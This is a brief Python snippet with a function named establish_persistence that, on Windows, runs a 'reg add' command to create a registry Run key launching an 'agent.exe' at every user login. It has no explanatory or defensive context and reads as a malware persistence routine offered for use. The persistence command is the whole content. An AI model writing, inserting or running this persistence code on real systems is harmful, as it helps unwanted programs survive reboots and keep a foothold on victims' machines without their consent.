import os

def establish_persistence():
    if os.name == 'nt':
        command = r'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d "C:\path\to\your\agent.exe" /f'
        os.system(command)
